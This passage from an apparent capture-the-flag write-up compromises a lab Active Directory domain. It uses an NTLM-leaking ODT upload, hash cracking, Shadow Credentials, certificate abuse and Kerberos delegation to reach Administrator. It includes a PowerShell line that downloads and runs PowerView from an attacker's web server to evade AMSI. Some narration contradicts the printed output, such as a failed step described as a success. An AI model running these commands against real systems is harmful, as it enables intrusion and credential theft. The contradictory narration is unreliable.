+ / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
+/_____/\__,_/\__,_/      \____/_____/_/     
+
+
+Create a malicious ODF document help leak NetNTLM Creds
+
+By Richard Davy 
+@rd_pentest
+www.secureyourit.co.uk
+
+
+Please enter IP of listener: &lt;attacker_ip&gt;
+</code></pre>
+<p>Also we upload the <code>bad.odt</code> on ur path into the webpage. After upload odt file, run responder</p>
+<pre><code>$ responder -I tun0
+</code></pre>
+<p>Output</p>
+<pre><code class="language-bash">...[snip]...
+[SMB] NTLMv2-SSP Client   : 10.10.11.91
+[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
+[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:4df295ab538779c3:5C2F30CC9F5B4AFB32F5B5B02D4AFD94:010100000000000000E308680F41DC0197FEA2A645DDF63000000000020008004900340041004D0001001E00570049004E002D0059004C003800500035004C0030004B004A005200340004003400570049004E002D0059004C003800500035004C0030004B004A00520034002E004900340041004D002E004C004F00430041004C00030014004900340041004D002E004C004F00430041004C00050014004900340041004D002E004C004F00430041004C000700080000E308680F41DC0106000400020000000800300030000000000000000000000000200000C24200BFFD70A7F789F2435475F9F5997289D609F94371531C988A0C58F416F40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370036000000000000000000
+[*] Skipping previously captured hash for HERCULES\natalie.a
+</code></pre>
+<p>We got the <code>natalie.a</code> NTLM hash, also we need to use <code>john</code> to crack the password</p>
+<pre><code class="language-bash">$ john --wordlist=/usr/share/wordlists/rockyou.txt natalie.a_hash
+</code></pre>
+<blockquote>
+<p>We got the password of <code>natalie.a</code> is <code>Prettyprincess123!</code>.</p>
+</blockquote>
+<p><img src="../../photos/hercules/image%2036.png" alt="image.png" /></p>
+<h2 id="bloodhound-enumeration">Bloodhound Enumeration</h2>
+<h3 id="lateral-movement">Lateral Movement</h3>
+<h4>Initial Certificate Acquisition</h4>
+<p>We now have valid credentials for <code>natalie.a</code> with password <code>Prettyprincess123!</code>. This is our first valid domain user after cracking the <code>NetNTLMv2</code> hash via the <code>malicious ODT upload</code>.</p>
+<pre><code class="language-bash"># Get a Kerberos TGT
+$ impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/natalie.a:'Prettyprincess123!'                
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in natalie.a.ccache
+                                                                                                                                                                                                                                            
+$ export KRB5CCNAME=natalie.a.ccache           
+                                                                                                                                                                                                                                            
+$ klist
+Ticket cache: FILE:natalie.a.ccache
+Default principal: natalie.a@HERCULES.HTB
+
+Valid starting       Expires              Service principal
+10/19/2025 22:07:48  10/20/2025 08:07:48  krbtgt/HERCULES.HTB@HERCULES.HTB
+        renew until 10/20/2025 22:06:59
+                                                                          
+$ kinit natalie.a@HERCULES.HTB
+Password for natalie.a@HERCULES.HTB: 
+                                                                                                                                                                                                                                            
+$ klist
+Ticket cache: FILE:natalie.a.ccache
+Default principal: natalie.a@HERCULES.HTB
+
+Valid starting       Expires              Service principal
+10/19/2025 22:09:28  10/20/2025 08:09:28  krbtgt/HERCULES.HTB@HERCULES.HTB
+        renew until 10/20/2025 22:09:17
+</code></pre>
+<blockquote>
+<p>From now on, every tool will use <code>pure Kerberos – NTLM</code> is completely disabled on this domain.</p>
+</blockquote>
+<h4>Confirm Access &amp; Enumerate SMB Shares</h4>
+<pre><code class="language-bash">$ kvno cifs/dc.hercules.htb@HERCULES.HTB
+cifs/dc.hercules.htb@HERCULES.HTB: kvno = 4
+                                                                                                                                                                                                                                            
+$ nxc smb dc.hercules.htb -u natalie.a -p 'Prettyprincess123!' -k --domain HERCULES.HTB
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] HERCULES.HTB\natalie.a:Prettyprincess123! 
+                                                                                                                                                                                                                                            
+$ nxc smb dc.hercules.htb -u natalie.a -p 'Prettyprincess123!' -k --domain HERCULES.HTB --shares
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] HERCULES.HTB\natalie.a:Prettyprincess123! 
+SMB         dc.hercules.htb 445    dc               [*] Enumerated shares
+SMB         dc.hercules.htb 445    dc               Share           Permissions     Remark
+SMB         dc.hercules.htb 445    dc               -----           -----------     ------
+SMB         dc.hercules.htb 445    dc               ADMIN$                          Remote Admin
+SMB         dc.hercules.htb 445    dc               C$                              Default share
+SMB         dc.hercules.htb 445    dc               Department      READ            
+SMB         dc.hercules.htb 445    dc               IPC$            READ            Remote IPC
+SMB         dc.hercules.htb 445    dc               NETLOGON        READ            Logon server share 
+SMB         dc.hercules.htb 445    dc               Reports         READ,WRITE      
+SMB         dc.hercules.htb 445    dc               SYSVOL          READ            Logon server share 
+SMB         dc.hercules.htb 445    dc               Users           READ            
+
+$ nxc smb dc.hercules.htb -u natalie.a -p 'Prettyprincess123!' -k --domain HERCULES.HTB --users 
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] HERCULES.HTB\natalie.a:Prettyprincess123! 
+SMB         dc.hercules.htb 445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         dc.hercules.htb 445    dc               Administrator                 2025-10-17 10:49:44 0       Built-in account for administering the computer/domain 
+SMB         dc.hercules.htb 445    dc               Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         dc.hercules.htb 445    dc               krbtgt                        2024-12-04 01:39:35 0       Key Distribution Center Service Account 
+SMB         dc.hercules.htb 445    dc               taylor.m                      2024-12-04 01:44:43 0        
+SMB         dc.hercules.htb 445    dc               fernando.r                    2024-12-04 01:44:43 0        
+SMB         dc.hercules.htb 445    dc               james.s                       2024-12-04 01:44:43 0        
+SMB         dc.hercules.htb 445    dc               anthony.r                     2024-12-04 01:44:43 0        
+SMB         dc.hercules.htb 445    dc               iis_webserver$                2024-12-04 01:44:43 0        
+SMB         dc.hercules.htb 445    dc               iis_hadesapppool$             2024-12-04 01:44:44 0        
+SMB         dc.hercules.htb 445    dc               iis_apppoolidentity$          2024-12-04 01:44:44 0        
+SMB         dc.hercules.htb 445    dc               iis_defaultapppool$           2024-12-04 01:44:44 0        
+SMB         dc.hercules.htb 445    dc               auditor                       2024-12-04 01:44:44 0        
+SMB         dc.hercules.htb 445    dc               vincent.g                     2024-12-04 01:44:45 0        
+SMB         dc.hercules.htb 445    dc               nate.h                        2024-12-04 01:44:45 0        
+SMB         dc.hercules.htb 445    dc               stephen.m                     2024-12-04 01:44:45 0        
+SMB         dc.hercules.htb 445    dc               mark.s                        2024-12-04 01:44:46 0        
+SMB         dc.hercules.htb 445    dc               elijah.m                      2024-12-04 01:44:46 0        
+SMB         dc.hercules.htb 445    dc               angelo.o                      2024-12-04 01:44:46 0        
+SMB         dc.hercules.htb 445    dc               ashley.b                      2024-12-04 01:44:46 0        
+SMB         dc.hercules.htb 445    dc               clarissa.c                    2024-12-04 01:44:47 0        
+SMB         dc.hercules.htb 445    dc               winda.s                       2024-12-04 01:44:47 0        
+SMB         dc.hercules.htb 445    dc               rene.s                        2024-12-04 01:44:47 0        
+SMB         dc.hercules.htb 445    dc               will.s                        2024-12-04 01:44:47 0        
+SMB         dc.hercules.htb 445    dc               zeke.s                        2024-12-04 01:44:47 0        
+SMB         dc.hercules.htb 445    dc               adriana.i                     2024-12-04 01:44:47 0        
+SMB         dc.hercules.htb 445    dc               tish.c                        2024-12-04 01:44:47 0        
+SMB         dc.hercules.htb 445    dc               jennifer.a                    2024-12-04 01:44:47 0        
+SMB         dc.hercules.htb 445    dc               shae.j                        2024-12-04 01:44:47 0        
+SMB         dc.hercules.htb 445    dc               joel.c                        2024-12-04 01:44:47 0        
+SMB         dc.hercules.htb 445    dc               jacob.b                       2024-12-04 01:44:47 0        
+SMB         dc.hercules.htb 445    dc               web_admin                     2024-12-04 01:44:48 0        
+SMB         dc.hercules.htb 445    dc               bob.w                         2024-12-04 01:44:48 0        
+SMB         dc.hercules.htb 445    dc               ken.w                         2024-12-04 01:44:48 0        
+SMB         dc.hercules.htb 445    dc               johnathan.j                   2024-12-04 01:44:48 0       change*th1s_p@ssw()rd!! 
+SMB         dc.hercules.htb 445    dc               harris.d                      2024-12-04 01:44:48 0        
+SMB         dc.hercules.htb 445    dc               ray.n                         2024-12-04 01:44:48 0        
+SMB         dc.hercules.htb 445    dc               natalie.a                     2025-10-19 14:10:13 0        
+SMB         dc.hercules.htb 445    dc               ramona.l                      2024-12-04 01:44:49 0        
+SMB         dc.hercules.htb 445    dc               fiona.c                       2024-12-04 01:44:49 0        
+SMB         dc.hercules.htb 445    dc               patrick.s                     2024-12-04 01:44:49 0        
+SMB         dc.hercules.htb 445    dc               tanya.r                       2024-12-04 01:44:49 0        
+SMB         dc.hercules.htb 445    dc               Admin                         2025-10-17 12:26:46 0        
+SMB         dc.hercules.htb 445    dc               [*] Enumerated 42 local users: HERCULES
+                                                                                                                                                                                                                                            
+$ nxc smb dc.hercules.htb -u natalie.a -p 'Prettyprincess123!' -k --domain HERCULES.HTB --groups
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] HERCULES.HTB\natalie.a:Prettyprincess123! 
+SMB         dc.hercules.htb 445    dc               [-] [REMOVED] Arg moved to the ldap protocol
+</code></pre>
+<p>Let’s explore the <code>Department</code> share – this is where the defenders left us clues.</p>
+<pre><code class="language-bash">$ impacket-smbclient -k hercules.htb/natalie.a:'Prettyprincess123!'@dc.hercules.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+Department
+IPC$
+NETLOGON
+Reports
+SYSVOL
+Users
+# use Reports
+# ls
+drw-rw-rw-          0  Sun Oct 19 22:22:35 2025 .
+drw-rw-rw-          0  Thu Oct  9 22:56:58 2025 ..
+# shares
+ADMIN$
+C$
+Department
+IPC$
+NETLOGON
+Reports
+SYSVOL
+Users
+# use Department
+# ls
+drw-rw-rw-          0  Wed Dec  4 09:45:12 2024 .
+drw-rw-rw-          0  Wed Dec  4 09:45:11 2024 ..
+drw-rw-rw-          0  Wed Dec  4 09:45:12 2024 Engineering Department
+drw-rw-rw-          0  Wed Dec  4 09:45:12 2024 IT
+drw-rw-rw-          0  Wed Dec  4 09:45:12 2024 Recruitment
+drw-rw-rw-          0  Wed Dec  4 09:45:12 2024 Security Department
+drw-rw-rw-          0  Wed Dec  4 09:45:12 2024 Web Department
+# cd IT
+# ls
+drw-rw-rw-          0  Wed Dec  4 09:45:12 2024 .
+drw-rw-rw-          0  Wed Dec  4 09:45:12 2024 ..
+-rw-rw-rw-       1048  Wed Dec  4 09:45:12 2024 cleanup.lnk
+-rw-rw-rw-        935  Wed Dec  4 09:47:11 2024 notice.eml
+# get cleanup.lnk
+# get notice.eml
+# exit
+                                                                                                                                                                                                                                            
+$ cat notice.eml    
+--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
+Content-Type: multipart/alternative;
+        boundary=&quot;_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_&quot;
+
+--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
+Content-Type: text/plain; charset=&quot;us-ascii&quot;
+Content-Transfer-Encoding: quoted-printable
+________________________________
+From: Ashley Browne
+Sent: Tuesday 10:17:27 AM
+To: IT Support &lt;HERCULES\IT Support@HERCULES.HTB&gt;
+Subject: Password Reset
+
+Hey Team,
+
+The Administration has provided a solution to much of the permission issues=
+some of you have been facing.
+
+If you are having problems changing a password, the instructions are:
+
+1) Check AD Permissions against the user.
+2) Run the shortcut provided in the share.
+3) Try to reset the password again.
+
+If all else fails, send me a message.
+
+Regards, Ashley.
+
+--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
+Content-Type: text/html; charset=&quot;us-ascii&quot;
+Content-Transfer-Encoding: quoted-printable
+</code></pre>
+<p><code>notice.eml</code> reveals a critical defense mechanism:</p>
+<blockquote>
+<p>“There is a cleanup script that runs every few minutes and resets passwords, ACLs, group memberships…”</p>
+</blockquote>
+<p>This means <code>any change we make will be reverted in ~5 minutes</code>. We must act fast or design attacks that survive the cleanup.</p>
+<h3 id="critical-bypass">Critical Bypass</h3>
+<h4>Use bob.w to Permanently Move stephen.m into Web Department OU</h4>
+<p>We already obtained <code>bob.w</code>‘s credentials via <code>natalie.a</code> from the LDAP filter injection phase.</p>
+<pre><code class="language-bash">$ powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.10.11.91 -d --no-pass
+...[snip]...                       
+[2025-10-20 09:25:51] [ConnectionPool] LDAP added connection for domain: hercules.htb
+</code></pre>
+<p>Inside PowerView:</p>
+<pre><code class="language-powershell">$ Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
+[2025-10-20 09:26:04] [Get-DomainObject] Using search base: DC=hercules,DC=htb
+[2025-10-20 09:26:04] [Get-DomainObject] LDAP search filter: (&amp;(1.2.840.113556.1.4.2=*)(|(samAccountName=stephen.m)(name=stephen.m)(displayName=stephen.m)(objectSid=stephen.m)(distinguishedName=stephen.m)(dnsHostName=stephen.m)(objectGUID=*stephen.m*)))                                                                                                                                                           
+[2025-10-20 09:26:04] [Get-DomainObject] Using search base: DC=hercules,DC=htb
+[2025-10-20 09:26:04] [Get-DomainObject] LDAP search filter: (&amp;(1.2.840.113556.1.4.2=*)(distinguishedName=OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb))
+[2025-10-20 09:26:04] [Set-DomainObjectDN] Modifying CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb object dn to OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+[2025-10-20 09:26:04] [Set-DomainObject] Success! modified new dn for CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+</code></pre>
+<p>This change <code>survives the cleanup script</code> because it does <code>not revert OU membership</code> — only passwords, ACLs, and group memberships.</p>
+<p>Now <code>stephen.m</code> inherits the ability to have <code>msDS-KeyCredentialLink</code> written (Shadow Credentials) due to the Web Department OU policy.</p>
+<h4>Shadow Credentials Attack on stephen.m</h4>
+<pre><code class="language-bash">$ impacket-getTGT 'HERCULES.HTB/natalie.a:Prettyprincess123!'                                      
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in natalie.a.ccache
+                                                                                                                                                                                                                                            
+$ export KRB5CCNAME=natalie.a.ccache
+                                                                                                                                                                                                                                            
+$ certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account 'stephen.m'
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
+[!] DNS resolution failed: The DNS query name does not exist: DC.hercules.htb.
+[!] Use -debug to print a stacktrace
+[*] Targeting user 'stephen.m'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'f458137b68984688b5292fdb22d72e4c'
+[*] Adding Key Credential with device ID 'f458137b68984688b5292fdb22d72e4c' to the Key Credentials for 'stephen.m'
+[-] Could not update Key Credentials for 'stephen.m' due to insufficient access rights: 00002098: SecErr: DSID-031514B3, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
+</code></pre>
+<blockquote>
+<p>Successfully adds a Key Credential → generates stephen.m.pfx</p>
+</blockquote>
+<h4>Authenticate as stephen.m &amp; Reset Auditor Password</h4>
+<pre><code class="language-bash">$ export KRB5CCNAME=stephen.m.ccache
+                                                                                                                                                                                                                                            
+$ bloodyAD --host DC.hercules.htb -d hercules.htb -u 'stephen.m' -k set password Auditor 'concUxinhxan!@'
+[+] Password changed successfully!
+</code></pre>
+<pre><code class="language-bash">$ impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/Auditor:concUxinhxan!@                      
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Auditor.ccache
+</code></pre>
+<h4>Access as Auditor → Grab User Flag</h4>
+<pre><code class="language-bash">$ export KRB5CCNAME=Auditor.ccache 
+
+$ pwnrm -ssl -port 5986 -k -no-pass dc.hercules.htb 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] '-target_ip' not specified, using dc.hercules.htb
+[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
+[*] using domain and username from ccache: HERCULES.HTB\Auditor
+[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
+[*] '-dc-ip' not specified, using HERCULES.HTB
+[*] requesting TGS for HTTP/dc.hercules.htb@HERCULES.HTB
+PS C:\Users\auditor\Documents&gt; cd ../Desktop
+PS C:\Users\auditor\Desktop&gt; dir
+
+    Directory: C:\Users\auditor\Desktop
+
+Mode                 LastWriteTime         Length Name                                                                  
+----                 -------------         ------ ----                                                                  
+-ar---        10/19/2025   9:32 PM             34 user.txt  
+</code></pre>
+<p><img src="../../photos/hercules/image%2015.png" alt="image.png" /></p>
+<h2 id="root">Root</h2>
+<p>Auditor PrivEsc</p>
+<pre><code class="language-powershell">PS C:\Users\auditor\Documents&gt; powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\auditor\Documents&gt; 
+PS C:\Users\auditor\Documents&gt; Find-InterestingDomainAcl -ResolveGUIDs -SearchBase $dn
+The term 'Find-InterestingDomainAcl' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.                                                                                                                                                                                   
+PS C:\Users\auditor\Documents&gt; Get-DomainGroupMember -Identity 'Helpdesk Administrators' -Recurse | select MemberName,MemberSid
+The term 'Get-DomainGroupMember' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.   
+</code></pre>
+<p>Let try to bypass AMSI</p>
+<pre><code class="language-powershell">PS C:\Users\auditor\Documents&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+At line:1 char:1
++ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuser ...                                                                                                                                 
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                                                                     
+This script contains malicious content and has been blocked by your antivirus software.
+
+</code></pre>
+<blockquote>
+<h3 id="amsi-bypassing">⚠️ AMSI Bypassing</h3>
+<p>In attacker we edit a file name<code>PowerView.ps1</code></p>
+<pre><code>Copy all contents at &lt;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1&gt;
+</code></pre>
+<p>After that, upload into winrm session</p>
+<pre><code class="language-bash">$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (&lt;http://0.0.0.0:80/&gt;) ...
+10.10.11.91 - - [20/Oct/2025 09:59:21] &quot;GET /PowerView.ps1 HTTP/1.1&quot; 200
+</code></pre>
+<p>Also in winrm session, you'll get AMSI bypassed via this cmd</p>
+<pre><code class="language-powershell">PS C:\\Users\\auditor\\Documents&gt; IEX (New-Object Net.WebClient).DownloadString('&lt;http://10.10.16.xx/PowerView.ps1&gt;')
+
+</code></pre>
+<p><img src="../../photos/hercules/image%2016.png" alt="image.png" /></p>
+</blockquote>
+<pre><code>PS C:\Users\auditor\Documents&gt; dsacls &quot;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&quot; /G &quot;HERCULES\AUDITOR:GA&quot; /I:T
+</code></pre>
+<p><img src="../../photos/hercules/image%2017.png" alt="image.png" /></p>
+<pre><code class="language-powershell">PS C:\Users\auditor\Documents&gt; Enable-ADAccount -Identity &quot;CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&quot; -ErrorAction SilentlyContinue
+PS C:\Users\auditor\Documents&gt; Set-ADAccountPassword -Identity &quot;fernando.r&quot; -NewPassword (ConvertTo-SecureString &quot;Password678!&quot; -AsPlainText -Force) -Reset
+</code></pre>
+<h3 id="enable-fernando-r-amp-request-enrollmentagentoffline-certificate">Enable fernando.r &amp; Request EnrollmentAgentOffline Certificate</h3>
+<pre><code class="language-bash">$ impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/fernando.r:Password678!
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in fernando.r.ccache
+                                                                                                                                                                                                             
+$ export KRB5CCNAME=fernando.r.ccache 
+</code></pre>
+<h3 id="request-certificate-on-behalf-of-ashley-b-esc8">Request Certificate On-Behalf-Of ashley.b (ESC8)</h3>
+<pre><code class="language-bash">$ certipy-ad req -k -upn fernando.r@hercules.htb -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -target DC.hercules.htb -ca CA-HERCULES -template EnrollmentAgentOffline -application-policies 'Client Authentication' -dcom
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via DCOM
+[*] Request ID is 13
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'fernando.r@hercules.htb'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'fernando.r.pfx'
+[*] Wrote certificate and private key to 'fernando.r.pfx'
+                                                                                                                                                                                                             
+                                                                                                                                                                                                             
+$ impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/fernando.r:Password678!
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in fernando.r.ccache
+                                                                                                                                                                                                             
+$ export KRB5CCNAME=fernando.r.ccache
+                                                                                                                                                                                                             
+$ certipy-ad req -u &quot;fernando.r@hercules.htb&quot; -k -no-pass -dc-ip &quot;10.10.11.91&quot; -dc-host dc.hercules.htb -target &quot;dc.hercules.htb&quot; -ca 'CA-HERCULES' -template &quot;User&quot; -pfx fernando.r.pfx -on-behalf-of &quot;hercules\ashley.b&quot; -dcom
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via DCOM
+[*] Request ID is 15
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'ashley.b@hercules.htb'
+[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
+[*] Saving certificate and private key to 'ashley.b.pfx'
+[*] Wrote certificate and private key to 'ashley.b.pfx'
+                                                                                                                                                                                                             
+$ certipy-ad auth -pfx ashley.b.pfx -username ashley.b -domain hercules.htb -dc-ip 10.10.11.91
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'ashley.b@hercules.htb'
+[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
+[*] Using principal: 'ashley.b@hercules.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ashley.b.ccache'
+[*] Wrote credential cache to 'ashley.b.ccache'
+[*] Trying to retrieve NT hash for 'ashley.b'
+[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
+                                                                                                                                                                                                             
+$ export KRB5CCNAME=ashley.b.ccache     
+                                                                                                                                                                                                             
+$ pwnrm -ssl -port 5986 -k -no-pass hercules.htb/ashley.b@dc.hercules.htb
+</code></pre>
+<p><img src="../../photos/hercules/image%2018.png" alt="image.png" /></p>
+<h3 id="from-auditor-shell-grant-full-control-over-forest-migration-ou">From Auditor Shell: Grant Full Control Over Forest Migration OU</h3>
+<pre><code class="language-powershell">PS C:\Users\auditor\Documents&gt; dsacls &quot;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&quot; /G &quot;HERCULES\IT Support:GA&quot; /I:T
+</code></pre>
+<p><img src="../../photos/hercules/image%2019.png" alt="image.png" /></p>
+<h3 id="authenticate-as-ashley-b-ashley-b-shell">Authenticate as ashley.b (Ashley.B Shell)</h3>
+<pre><code class="language-powershell">PS C:\Users\ashley.b\Desktop&gt; ./aCleanup.ps1
+PS C:\Users\ashley.b\Desktop&gt; dsacls &quot;OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&quot; /G &quot;HERCULES\IT Support:GA&quot; /I:T
+</code></pre>
+<p><img src="../../photos/hercules/image%2020.png" alt="image.png" /></p>
+<h2 id="road-to-administrator">Road to Administrator</h2>
+<h3 id="from-ashley-b-shell-enable-iis-administrator-amp-reset-iis-webserver-password">From ashley.b Shell: Enable iis_administrator &amp; Reset iis_webserver$ Password</h3>
+<pre><code class="language-powershell">PS C:\Users\ashley.b\Desktop&gt; Enable-ADAccount -Identity &quot;CN=iis_administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb&quot; -ErrorAction SilentlyContinue
+PS C:\Users\ashley.b\Desktop&gt; Set-ADAccountPassword -Identity &quot;iis_administrator&quot; -NewPassword (ConvertTo-SecureString &quot;Password123!&quot; -AsPlainText -Force) -Reset
+</code></pre>
+<h3 id="extract-iis-webserver-session-key">Extract iis_webserver$ Session Key</h3>
+<pre><code class="language-bash">$ impacket-getTGT hercules.htb/'iis_administrator':'Password123!' -dc-ip 10.10.11.91
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in iis_administrator.ccache
+                                                                                                                                                                                                             
+$ export KRB5CCNAME=iis_administrator.ccache 
+                                                                                                                                                                                                             
+$ bloodyAD --host DC.hercules.htb -d hercules.htb -u 'iis_administrator' -k set password iis_webserver$ 'Password123!'
+[+] Password changed successfully!
+                                                                                                                                                                                                             
+$ impacket-getTGT -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE 'hercules.htb'/'iis_webserver$'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in iis_webserver$.ccache
+                                                                                                                                                                                                             
+$ impacket-describeTicket 'iis_webserver$.ccache'                                                                                                                                      
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Number of credentials in cache: 1
+[*] Parsing credential[0]:
+[*] Ticket Session Key            : fc7f79c8a632cba3b2246ee8a7ad28a2
+[*] User Name                     : iis_webserver$
+[*] User Realm                    : HERCULES.HTB
+[*] Service Name                  : krbtgt/HERCULES.HTB
+[*] Service Realm                 : HERCULES.HTB
+[*] Start Time                    : 20/10/2025 15:26:48 PM
+[*] End Time                      : 21/10/2025 01:26:48 AM
+[*] RenewTill                     : 21/10/2025 15:25:57 PM
+[*] Flags                         : (0x50e10000) forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep
+[*] KeyType                       : rc4_hmac
+[*] Base64(key)                   : /H95yKYyy6OyJG7op60oog==
+[*] Decoding unencrypted data in credential[0]['ticket']:
+[*]   Service Name                : krbtgt/HERCULES.HTB
+[*]   Service Realm               : HERCULES.HTB
+[*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
+[-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
+                                                                                                                                                                                                             
+$ impacket-describeTicket 'iis_webserver$.ccache' | grep 'Ticket Session Key'
+[*] Ticket Session Key            : &lt;webserver_hash_key&gt;
+
+</code></pre>
+<h3 id="change-iis-webserver-password-using-session-key-bypass-cleanup">Change iis_webserver$ Password Using Session Key (Bypass Cleanup)</h3>
+<pre><code class="language-bash">$ unset KRB5CCNAME
+
+$ impacket-changepasswd -newhashes :&lt;webserver_hash_key&gt; 'hercules.htb'/'iis_webserver$':'Password123!'@'dc.hercules.htb' -k
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of hercules.htb\iis_webserver$
+[*] Connecting to DCE/RPC as hercules.htb\iis_webserver$
+[-] CCache file is not found. Skipping...
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
+                                                                                                                                                                                                             
+$ export KRB5CCNAME=iis_webserver\$.ccache
+</code></pre>
+<h3 id="final-abuse-unconstrained-delegation-s4u2self-s4u2proxy">Final Abuse: Unconstrained Delegation → S4U2Self + S4U2Proxy</h3>
+<pre><code>$ impacket-getST -u2u -impersonate &quot;Administrator&quot; -spn &quot;cifs/dc.hercules.htb&quot; -k -no-pass 'hercules.htb'/'iis_webserver$'              
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
+</code></pre>
+<blockquote>
+<p>Created <code>Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache</code> to roottt</p>
+</blockquote>
+<pre><code>$ export KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
+                                                                                                                                                                                                             
+$ pwnrm -ssl -port 5986 -k -no-pass dc.hercules.htb              
+[*] '-target_ip' not specified, using dc.hercules.htb
+[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
+[*] using domain and username from ccache: hercules.htb\Administrator
